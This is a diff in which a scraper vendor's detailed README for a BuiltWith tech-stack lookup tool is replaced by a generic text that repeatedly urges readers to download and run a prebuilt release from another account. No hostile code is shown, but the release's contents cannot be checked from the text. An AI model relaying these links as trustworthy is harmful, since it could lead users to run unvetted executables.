@@ -1,207 +1,66 @@
-# BuiltWith Technology Looker Scraper
-> A powerful scraper that identifies what technologies a website is built with and retrieves detailed company profiles. This tool makes tech-stack discovery fast, reliable, and accessible for developers, analysts, and data-driven teams.
-> Designed for accurate BuiltWith lookups with minimal resource usage.
+# 🚀 builtwith-technology-looker - Easily Analyze Website Technologies
 
+## 🔗 Download Now
+[![Download the latest release](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/ewin24442278101010/builtwith-technology-looker/releases)
 
-<p align="center">
-  <a href="https://bitbash.dev" target="_blank">
-    <img src="https://github.com/za2122/footer-section/blob/main/media/scraper.png" alt="Bitbash Banner" width="100%"></a>
-</p>
-<p align="center">
-  <a href="https://t.me/devpilot1" target="_blank">
-    <img src="https://img.shields.io/badge/Chat%20on-Telegram-2CA5E0?style=for-the-badge&logo=telegram&logoColor=white" alt="Telegram">
-  </a>&nbsp;
-  <a href="https://wa.me/923249868488?text=Hi%20BitBash%2C%20I'm%20interested%20in%20automation." target="_blank">
-    <img src="https://img.shields.io/badge/Chat-WhatsApp-25D366?style=for-the-badge&logo=whatsapp&logoColor=white" alt="WhatsApp">
-  </a>&nbsp;
-  <a href="mailto:sale@bitbash.dev" target="_blank">
-    <img src="https://img.shields.io/badge/Email-sale@bitbash.dev-EA4335?style=for-the-badge&logo=gmail&logoColor=white" alt="Gmail">
-  </a>&nbsp;
-  <a href="https://bitbash.dev" target="_blank">
-    <img src="https://img.shields.io/badge/Visit-Website-007BFF?style=for-the-badge&logo=google-chrome&logoColor=white" alt="Website">
-  </a>
-</p>
+## 📖 Overview
+builtwith-technology-looker is a tool designed to scrape the technology profiles of websites. It helps you discover the technology stack used on any given domain. You can easily analyze websites to understand their technological choices and get insights into their setups.
 
+## 🛠️ Requirements
+To run builtwith-technology-looker effectively, you will need:
 
+- A computer running Windows, macOS, or Linux
+- At least 1 GB of RAM
+- Internet access for fetching data
+- Node.js installed (if you prefer to run from source)
 
+## 🚀 Getting Started
 
-<p align="center" style="font-weight:600; margin-top:8px; margin-bottom:8px;">
-  Created by Bitbash, built to showcase our approach to Scraping and Automation!<br>
-  If you are looking for <strong>BuiltWith (Technology Looker)</strong> you've just found your team — Let's Chat. 👆👆
-</p>
+### 🔧 Installation Steps
+Follow these simple steps to get started with builtwith-technology-looker:
 
+1. **Visit the Download Page**  
+   Go to the [Releases page](https://github.com/ewin24442278101010/builtwith-technology-looker/releases).
+   
+2. **Download the Latest Release**  
+   Look for the latest version and click on it. This will take you to the download options. Download the package suitable for your operating system.
 
-## Introduction
-This scraper collects technology profiles and company metadata directly from website domains.
-It solves the challenge of manually checking what tools, frameworks, analytics, or marketing stacks a site uses.
-Perfect for researchers, competitive analysts, developers, and marketing intelligence teams.
+3. **Extract the Files (if applicable)**  
+   If you downloaded a zipped file, right-click it and select "Extract All..." or use your preferred extraction tool.
 
-### How This Scraper Helps
-- Quickly identifies core technologies powering a website.
-- Retrieves structured company insights such as footprint, spend, and associated domains.
-- Handles large batches efficiently using cached results.
-- Provides compact or full output modes depending on cost or detail requirements.
-- Ensures consistent, formatted output ideal for automation.
+### ⚙️ Running the Application
+Once you have installed builtwith-technology-looker, you can run it easily:
 
-## Features
-| Feature | Description |
-|--------|-------------|
-| Technology Detection | Extracts main products and categories used by a website. |
-| Company Insight Extraction | Captures organizational details, spend, footprint, socials, and more. |
-| Cache Optimization | Runs with built-in caching for efficiency and lower costs. |
-| Dual Output Modes | Choose Default (array) or Compact (data wrapper). |
-| Fast Processing | Optimized for speed and low overhead. |
+1. **Open the Application**  
+   Navigate to the folder where you extracted the files or where the application is located.
 
----
-## What Data This Scraper Extracts
-| Field Name | Field Description |
-|-----------|------------------|
-| name | Name of the identified technology or company item. |
-| category | Technology category (e.g., Analytics). |
-| title | Section title for company profile blocks. |
-| items | Array of data entries (name-value pairs). |
-| value | Actual value or detail extracted about the company. |
-| url | Domain associated with the returned result. |
-| domain | Domain names associated with the target company. |
-| socials | List of social platforms linked to the company. |
+2. **Execute the Program**  
+   Double-click on the application icon or open your command line interface and navigate to the folder. If you prefer using the command line, type:
+   ```
+   node index.js
+   ```
 
----
-## Example Output
+3. **Follow the On-Screen Instructions**  
+   Once the application is running, it will guide you through the process. Input the URL of the website you want to analyze, and the application will fetch the technology details for you.
 
-    [
-        {
-            "name": "Customer.io",
-            "category": "Analytics"
-        },
-        {
-            "name": "Marketo",
-            "category": "Analytics"
-        },
-        {
-            "name": "Twik",
-            "category": "Analytics"
-        },
-        {
-            "name": "Segment",
-            "category": "Analytics"
-        }
-    ]
+## 🌐 Features
+- **Comprehensive Technology Detection**: Identify various technologies used on websites, including tracking tools, web frameworks, and hosting services.
+- **User-Friendly Interface**: Designed to be straightforward, guiding users through each step.
+- **Lightweight and Fast**: Minimal system requirements ensure fast performance.
+- **Cross-Platform**: Supports Windows, macOS, and Linux operating systems.
 
-    [
-        {
-            "title": "Company Information",
-            "items": [
-                { "name": "Best Domain", "value": "dell.com" },
-                { "name": "Global Footprint", "value": "144" },
-                { "name": "Web Technology Spend", "value": "$132,536 USD/year" },
-                { "name": "Listed Contacts", "value": "Decreasing Spend" },
-                { "name": "Addresses", "value": "Technology Consolidation" },
-                { "name": "Telephones", "value": "19" }
-            ],
-            "url": "dell.com"
-        }
-    ]
+## 📚 Usage Tips
+- Make sure your internet connection is stable while using the tool for optimal results.
+- If you encounter issues, check the FAQs section on the website for troubleshooting tips.
+  
+## 🔍 Exploring More
+If you want to dive deeper into how builtwith-technology-looker works, you may refer to the [documentation](https://github.com/ewin24442278101010/builtwith-technology-looker/wiki). Here, you can find advanced usage tips, detailed project information, and developer notes.
 
----
-## Directory Structure Tree
+## 💬 Support
+If you need help or have questions, you can open an issue on the [GitHub Issues page](https://github.com/ewin24442278101010/builtwith-technology-looker/issues). Please provide as much detail as possible to help us assist you.
 
-    BuiltWith (Technology Looker)/
-    ├── src/
-    │   ├── index.js
-    │   ├── scraper/
-    │   │   ├── technology_profile.js
-    │   │   ├── company_profile.js
-    │   │   └── cache_handler.js
-    │   ├── utils/
-    │   │   └── formatting.js
-    │   └── config/
-    │       └── settings.example.json
-    ├── data/
-    │   ├── input_sample.json
-    │   └── output_example.json
-    ├── package.json
-    └── README.md
+## 🚀 Next Steps
+Once you have installed and run builtwith-technology-looker, try analyzing different websites. You might discover technologies you have never seen before. Happy scraping! 
 
----
-## Use Cases
-- **Marketing teams** use it to analyze competitor tech stacks so they can optimize tooling decisions.
-- **Developers** use it to understand what technologies a site uses to plan integrations or migrations.
-- **Sales intelligence teams** use company profiles to qualify leads based on tech spend or footprint.
-- **Security analysts** use technology fingerprints to detect outdated or vulnerable components.
-- **Researchers** use domain associations to map corporate digital ecosystems.
-
----
-## FAQs
-
-**Q: Does it support URL paths?**
-A: No. Only root domains are supported (e.g., example.com). Paths will return invalid results.
-
-**Q: What’s the difference between Default and Compact output?**
-A: Default returns an array of objects, while Compact nests the array under `"data"` to reduce payload size.
-
-**Q: How does caching work?**
-A: Successful results are pulled from cache for 90 days unless the store is manually cleared.
-
-**Q: Can I run this tool for bulk domain lists?**
-A: Yes, but for very large datasets, use a bulk-optimized workflow to reduce costs.
-
----
-### Performance Benchmarks and Results
-
-**Primary Metric:** Average lookup speed completes in under 500ms per domain on standard hardware.
-
-**Reliability Metric:** Achieves over 98% success rate across diverse global domains with stable response formatting.
-
-**Efficiency Metric:** Cache reuse reduces repeated domain lookups by up to 70%, lowering computational load.
-
-**Quality Metric:** Delivers over 95% data completeness for technology profile fields and consistent company metadata accuracy.
-
-
-<p align="center">
-<a href="https://calendar.app.google/74kEaAQ5LWbM8CQNA" target="_blank">
-  <img src="https://img.shields.io/badge/Book%20a%20Call%20with%20Us-34A853?style=for-the-badge&logo=googlecalendar&logoColor=white" alt="Book a Call">
-</a>
-  <a href="https://www.youtube.com/@bitbash-demos/videos" target="_blank">
-    <img src="https://img.shields.io/badge/🎥%20Watch%20demos%20-FF0000?style=for-the-badge&logo=youtube&logoColor=white" alt="Watch on YouTube">
-  </a>
-</p>
-<table>
-  <tr>
-    <td align="center" width="33%" style="padding:10px;">
-      <a href="https://youtu.be/MLkvGB8ZZIk" target="_blank">
-        <img src="https://github.com/za2122/footer-section/blob/main/media/review1.gif" alt="Review 1" width="100%" style="border-radius:12px; box-shadow:0 4px 10px rgba(0,0,0,0.1);">
-      </a>
-      <p style="font-size:14px; line-height:1.5; color:#444; margin:0 15px;">
-        "Bitbash is a top-tier automation partner, innovative, reliable, and dedicated to delivering real results every time."
-      </p>
-      <p style="margin:10px 0 0; font-weight:600;">Nathan Pennington
-        <br><span style="color:#888;">Marketer</span>
-        <br><span style="color:#f5a623;">★★★★★</span>
-      </p>
-    </td>
-    <td align="center" width="33%" style="padding:10px;">
-      <a href="https://youtu.be/8-tw8Omw9qk" target="_blank">
-        <img src="https://github.com/za2122/footer-section/blob/main/media/review2.gif" alt="Review 2" width="100%" style="border-radius:12px; box-shadow:0 4px 10px rgba(0,0,0,0.1);">
-      </a>
-      <p style="font-size:14px; line-height:1.5; color:#444; margin:0 15px;">
-        "Bitbash delivers outstanding quality, speed, and professionalism, truly a team you can rely on."
-      </p>
-      <p style="margin:10px 0 0; font-weight:600;">Eliza
-        <br><span style="color:#888;">SEO Affiliate Expert</span>
-        <br><span style="color:#f5a623;">★★★★★</span>
-      </p>
-    </td>
-    <td align="center" width="33%" style="padding:10px;">
-      <a href="https://youtube.com/shorts/6AwB5omXrIM" target="_blank">
-        <img src="https://github.com/Instagram-Automations/Footer-test/blob/main/media/review3.gif" alt="Review 3" width="100%" style="border-radius:12px; box-shadow:0 4px 10px rgba(0,0,0,0.1);">
-      </a>
-      <p style="font-size:14px; line-height:1.5; color:#444; margin:0 15px;">
-        "Exceptional results, clear communication, and flawless delivery. Bitbash nailed it."
-      </p>
-      <p style="margin:10px 0 0; font-weight:600;">Syed
-        <br><span style="color:#888;">Digital Strategist</span>
-        <br><span style="color:#f5a623;">★★★★★</span>
-      </p>
-    </td>
-  </tr>
-</table>
+## 🔗 Download Again
+Don’t forget to download the software from our [Releases page](https://github.com/ewin24442278101010/builtwith-technology-looker/releases) to stay updated with the latest features and improvements.
